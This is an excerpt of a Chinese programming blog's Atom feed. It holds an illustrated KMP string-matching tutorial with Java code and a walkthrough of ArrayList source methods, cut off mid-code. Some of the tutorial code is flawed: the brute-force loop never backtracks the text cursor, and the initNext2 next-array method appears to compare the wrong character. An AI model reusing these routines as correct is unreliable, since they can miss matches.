    <category term="树" scheme="https://www.fvolcano.red/tags/%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>KMP字符串匹配算法图解</title>
    <link href="https://www.fvolcano.red/2020/KMP-elaboration/"/>
    <id>https://www.fvolcano.red/2020/KMP-elaboration/</id>
    <published>2020-10-02T00:56:17.000Z</published>
    <updated>2020-10-02T00:56:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>KMP算法是字符串匹配算法中对暴力匹配算法的优化。我尽量用容易理解的方法把它写 &amp; 画清楚。<a id="more"></a></p><h1 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h1><p>暴力破解。这是最朴素的一种解决方案：从文本串（即被匹配的大字符串，以下都是）的第一个字符开始，一位一位地与模式串（即搜索的关键字，以下都是）的对应位置相比较。</p><p><img src="/2020/KMP-elaboration/%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%951.png" alt="暴力算法"></p><p>设文本串(p)的长度为m，模式串(s)的长度为n。i，j分别是指向文本串、模式串的游标。</p><p>while（i &lt; m) {</p><p>​    if (p[i] != s[j]) {</p><p>​        i++;  j = 0;</p><p>​    } else {</p><p>​        i++;  j++;</p><p>​    }</p><p>}</p><p>但可想而知，这样的匹配算法时间复杂度几乎为O(mn)。但仔细想想，我们确实没必要再比较上图中第二步的a与b，因为在第一步已经比较到了文本串的b，我们应该让程序“记住”它比较过了的东西，在明显与模式串的第一个字符不相同后，就应该去掉第二步。</p><p>但我们不能真的去把之前比较过的数据保存起来，那样既增加了空间开销，又没能达到优化的目的。于是，KMP就要登场了，它能帮程序不用像傻子一样（虽然它就是）一个一个地比较下去。</p><h1 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h1><h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p>有一种巧妙的方法。因为假设比较到第k位就失配了（崩了），那么有一个事实是可以确定的：两个串前k-1个字符肯定是相同的。那么！因为模式串是已经定好的，在匹配到j == k时停下来，我们（程序）就知道在文本串中 [i-j, i-1]的字符是什么了。那么知道了以后呢？我们的目的是不要像暴力算法那样一个个比，那就得跳过一些，但又不能把能匹配得上的给跳过了，那么我们就需要看已知的（已经比较过的）文本串中有没有跟模式串开头相同的字符（串）了。<strong>没有的话就可以直接跳过前j个</strong>，有的话就跳到相同的那一部分继续往下比较。</p><p>这里面有一个小点，既然我们已经知道其中有连续的几个是与模式串的前缀（即前面连续的几个）是相同的，那么也没必要再比较了，直接从文本串中程序“未知的”那一个位置继续下去。</p><p>如下图，前面三个aba已知，同时模式串a又能与aba中第二个a匹配，那么就直接把模式串移到<strong>模式串开头的a与aba中第二个a</strong>匹配的位置，同时把模式串的游标j移到a后面的b，从它开始比较。</p><p><img src="/2020/KMP-elaboration/KMP.png" alt="KMP"></p><p>可是，问题又来了。怎么要让程序知道应该跳过其中的多少步呢？</p><p>这就又要归功于模式串的<u>已知</u>和<u>不变</u>了，我们现在的任务是什么？我们现在的任务就是在一段已知的字符串（即已经比较过的那一段，也即模式串的一个前缀，上图中的aba）中找是不是有（<strong>它的</strong>）前缀后缀相同的地方啊。如上图，前后缀相同的就是a。</p><p>相同有什么用呢？因为我们要找相同的这一段恰好就是模式串的前缀，且我们是在这一段字符的下一个字符失配的，我们找到这一个字符串中后面某几位是否与前面的某几位相同，就可以知道这里面有没有我们需要移动模式串的位置再匹配一下的地方了。</p><p>那么，我们可以针对模式串建立一个数组 next[]。next[m]里面存储的是若在（模式串）第m位失配，下一次比较中模式串的游标应该要指向的位置。<strong>文本串的游标不变</strong>。当需要用到next[i]时，说明前面i-1个字符都是匹配的，到了第i个不相同，那么就需要在<strong>前i-1个字符组成的字符串中</strong>找是否有相同的前后缀。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>由此可以写出kmp基本代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmp</span><span class="params">(String p, String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>[] next = <span class="keyword">new</span> <span class="keyword">int</span>[s.length()];</span><br><span class="line">    <span class="comment">//initNext1(s, next);</span></span><br><span class="line">    initNext2(s, next);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;p.length() &amp;&amp; j&lt;s.length()) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p.charAt(i) == s.charAt(j)) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="comment">// 因为将next[0]设置为-1，代表需要移动文本串游标</span></span><br><span class="line">            <span class="comment">// 因此需要将j==0的情况单独抽离出来，防止下标越界（j被赋值为-1）</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j == s.length()) <span class="keyword">return</span> i - j + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initNext（生成next数组）有两种方法：数学归纳法和先前搜索法。</p><h2 id="生成next数组"><a href="#生成next数组" class="headerlink" title="生成next数组"></a>生成next数组</h2><p>将next[0]设置为-1，代表需要移动文本串游标。若设置为0，则在第一个字符就失配的情况下会陷入死循环。next[1] = 0：若第二个字符失配，则将模式串向后移1位，即游标指向0，从头开始。</p><h3 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h3><p>假设next[j]已知，求出next[j+1]的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 生成next数组（数学归纳法）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initNext1</span><span class="params">(String s, <span class="keyword">int</span>[] next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(next.length == <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>, k = next[j];  <span class="comment">// next[0]已经确定，从next[1]开始生成，j=1</span></span><br><span class="line">    <span class="keyword">while</span>(j + <span class="number">1</span> &lt; next.length) &#123;  <span class="comment">// 确定j后面还有字符（存在失配可能）</span></span><br><span class="line">        <span class="keyword">while</span>(k != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(j) == s.charAt(k)) &#123; </span><br><span class="line">                next[j+<span class="number">1</span>] = k + <span class="number">1</span>;   <span class="comment">// k=next[j]</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k = next[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k == -<span class="number">1</span>) next[j+<span class="number">1</span>] = <span class="number">0</span>;  <span class="comment">// 说明S0 != Sj</span></span><br><span class="line">        j++;</span><br><span class="line">        k = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/KMP-elaboration/next.jpg" alt="next"></p><h3 id="向前搜索法"><a href="#向前搜索法" class="headerlink" title="向前搜索法"></a>向前搜索法</h3><p>朴素解法。从前缀 &amp; 后缀的后面开始比较。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 生成next数组（向前搜索）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initNext2</span><span class="params">(String s, <span class="keyword">int</span>[] next)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(next.length == <span class="number">1</span>) &#123;</span><br><span class="line">        next[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;s.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i-<span class="number">1</span>; j&gt;=<span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> find = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == s.charAt(j)) &#123;</span><br><span class="line">                <span class="keyword">int</span> i1 = i, j1 = j;</span><br><span class="line">                <span class="keyword">while</span>(j1 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s.charAt(i1) == s.charAt(j1)) &#123;</span><br><span class="line">                        i1--;</span><br><span class="line">                        j1--;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        find = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(find) &#123;</span><br><span class="line">                    next[i] = j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0</span>) next[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/KMP-elaboration/next2.jpg" alt="next2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;KMP算法是字符串匹配算法中对暴力匹配算法的优化。我尽量用容易理解的方法把它写 &amp;amp; 画清楚。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="图解" scheme="https://www.fvolcano.red/tags/%E5%9B%BE%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>Java Collection及其实现源码</title>
    <link href="https://www.fvolcano.red/2020/Java-Collection-sourcecode/"/>
    <id>https://www.fvolcano.red/2020/Java-Collection-sourcecode/</id>
    <published>2020-10-02T00:56:17.000Z</published>
    <updated>2020-10-02T00:56:17.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/Java-Collection-sourcecode/Collection.jpg" alt="Collection"></p><a id="more"></a><p>各接口、抽象类作用：</p><ul><li><p><strong>RandomAccess</strong> 是一个标记接口，用于标记实现该接口的集合支持快速随机访问。</p></li><li><p><strong>Serializable</strong> 是一个标记接口，用于标记实现该接口的类可以序列化。</p></li><li><p><strong>Cloneable</strong> 是一个标记接口，用于标记实现该接口的类可以调用 clone 方法，否则会抛异常。</p></li><li><p><strong>Iterable</strong> 是一个遍历接口，内部提供了支持不同遍历方式的方法，比如顺序遍历迭代器、函数式的 foreach 遍历、并行遍历迭代器。</p></li><li><p><strong>Collection</strong> 是 java 集合体系的根接口，包含了通用的遍历、修改方法，例如 addAll、removeAll。</p></li><li><p><strong>AbstractCollection</strong> 是一个抽象类，重写了 Collection 中最基础的方法，减少具体集合类的实现成本，比如 contains、isEmpty、toArray，iterator，但是 add 等需要具体集合类自我实现。</p></li><li><p><strong>List</strong> 是 java 有序集合的基础接口，除了 Collection 的方法，还有支持倒序遍历的 listIterator 方法、子列表 subList 方法，另外重写 spliterator 方法的实现。</p></li><li><p><strong>AbstractList</strong> 是一个抽象类，重写了 List 的大部分方法，作用跟 AbstractCollection 类似。</p></li></ul><h1 id="List"><a href="#List" class="headerlink" title="List"></a>List</h1><p>List 是一个接口，定义一组有序、可重复的元素集合。</p><p><img src="/2020/Java-Collection-sourcecode/List%E6%96%B9%E6%B3%95.jpg" alt="List方法"></p><p>较之 Collection，List 还添加了以下操作方法</p><ul><li>位置相关：List 的元素是有序的，因此有get(index)、set(index,object)、add(index,object)、remove(index) 方法。</li><li>搜索：indexOf()，lastIndexOf();</li><li>迭代：使用 Iterator 的功能板迭代器</li><li>范围性操作：使用 subList 方法对 list 进行任意范围操作。</li></ul><h2 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h2><h3 id="AbstractList"><a href="#AbstractList" class="headerlink" title="AbstractList"></a>AbstractList</h3><p>是List的抽象实现类，继承自 AbstractCollection 类。整个类的设计类似于AbstractCollection,实现了大多数方法，抽象了对于需要根据数据操作的方法。</p><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>ArrayList 是我们最常用的一个类，它具有如下特点：</p><ul><li>可以动态扩容</li><li>有序</li><li>元素可以为 null</li><li>效率高<ul><li>查找操作的时间复杂度是 O(1)</li><li>增删操作的时间复杂度是 O(n)</li><li>其他操作基本也都是 O(n)</li></ul></li><li>占用空间少，相比 LinkedList，不用占用额外空间维护表结构</li></ul><p><img src="/2020/Java-Collection-sourcecode/ArrayList.jpg" alt="ArrayList"></p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ensureCapacityInternal(<span class="keyword">this</span>.size + <span class="number">1</span>); <span class="comment">// Increments modCount!!</span></span><br><span class="line">    <span class="keyword">this</span>.elementData[<span class="keyword">this</span>.size++] = var1;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    ensureExplicitCapacity(calculateCapacity(elementData, minCapacity));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureExplicitCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">if</span> (minCapacity - elementData.length &gt; <span class="number">0</span>)</span><br><span class="line">        grow(minCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">    <span class="keyword">int</span> newCapacity = oldCapacity + (oldCapacity &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    <span class="comment">// minCapacity is usually close to size, so this is a win:</span></span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">    <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">        Integer.MAX_VALUE :</span><br><span class="line">    MAX_ARRAY_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    rangeCheck(index);<span class="comment">//判断是否越界</span></span><br><span class="line">    modCount++;<span class="comment">//修改modeCount 因为结构改变了</span></span><br><span class="line">    E oldValue = elementData(index);<span class="comment">//读出要删除的值</span></span><br><span class="line">    <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);<span class="comment">//用复制 覆盖数组数据</span></span><br><span class="line">    elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work  //置空原尾部数据 不再强引用， 可以GC掉</span></span><br><span class="line">    <span class="keyword">return</span> oldValue;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据下标从数组取值 并强转</span></span><br><span class="line"><span class="function">E <span class="title">elementData</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (E) elementData[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除该元素在数组中第一次出现的位置上的数据。 如果有该元素返回true，如果false。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[index] == <span class="keyword">null</span>) &#123;</span><br><span class="line">                fastRemove(index);<span class="comment">//根据index删除元素</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>; index &lt; size; index++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[index])) &#123;</span><br><span class="line">                fastRemove(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不会越界 不用判断 ，也不需要取出该元素。</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">fastRemove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    modCount++;<span class="comment">//修改modCount</span></span><br><span class="line">    <span class="keyword">int</span> numMoved = size - index - <span class="number">1</span>;<span class="comment">//计算要移动的元素数量</span></span><br><span class="line">    <span class="keyword">if</span> (numMoved &gt; <span class="number">0</span>)</span><br><span class="line">        System.arraycopy(elementData, index+<span class="number">1</span>, elementData, index,</span><br><span class="line">                         numMoved);<span class="comment">//以复制覆盖元素 完成删除</span></span><br><span class="line">    elementData[--size] = <span class="keyword">null</span>; <span class="comment">// clear to let GC do its work  //置空 不再强引用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//批量删除</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">removeAll</span><span class="params">(Collection&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">    Objects.requireNonNull(c);<span class="comment">//判空</span></span><br><span class="line">    <span class="keyword">return</span> batchRemove(c, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//批量移动</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">batchRemove</span><span class="params">(Collection&lt;?&gt; c, <span class="keyword">boolean</span> complement)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Object[] elementData = <span class="keyword">this</span>.elementData;</span><br><span class="line">    <span class="keyword">int</span> r = <span class="number">0</span>, w = <span class="number">0</span>;<span class="comment">//w 代表批量删除后 数组还剩多少元素</span></span><br><span class="line">    <span class="keyword">boolean</span> modified = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//高效的保存两个集合公有元素的算法</span></span><br><span class="line">        <span class="keyword">for</span> (; r &lt; size; r++)</span><br><span class="line">            <span class="keyword">if</span> (c.contains(elementData[r]) == complement) <span class="comment">// 如果 c里不包含当前下标元素， </span></span><br><span class="line">                elementData[w++] = elementData[r];<span class="comment">//则保留</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// Preserve behavioral compatibility with AbstractCollection,</span></span><br><span class="line">        <span class="comment">// even if c.contains() throws.</span></span><br><span class="line">        <span class="keyword">if</span> (r != size) &#123; <span class="comment">//出现异常会导致 r !=size , 则将出现异常处后面的数据全部复制覆盖到数组里。</span></span><br><span class="line">            System.arraycopy(elementData, r,</span><br><span class="line">                             elementData, w,</span><br><span class="line">                             size - r);</span><br><span class="line">            w += size - r;<span class="comment">//修改 w数量</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (w != size) &#123;<span class="comment">//置空数组后面的元素</span></span><br><span class="line">            <span class="comment">// clear to let GC do its work</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = w; i &lt; size; i++)</span><br><span class="line">                elementData[i] = <span class="keyword">null</span>;</span><br><span class="line">            modCount += size - w;<span class="comment">//修改modCount</span></span><br><span class="line">            size = w;<span class="comment">// 修改size</span></span><br><span class="line">            modified = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> modified;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==注==：增删改查中， 增导致扩容，则会修改modCount，删也一定会修改。 改和查一定不会修改modCount。</p><h4 id="contains"><a href="#contains" class="headerlink" title="contains"></a>contains</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//普通的for循环寻找值，只不过会根据目标对象是否为null分别循环查找。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> indexOf(o) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//普通的for循环寻找值，只不过会根据目标对象是否为null分别循环查找。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 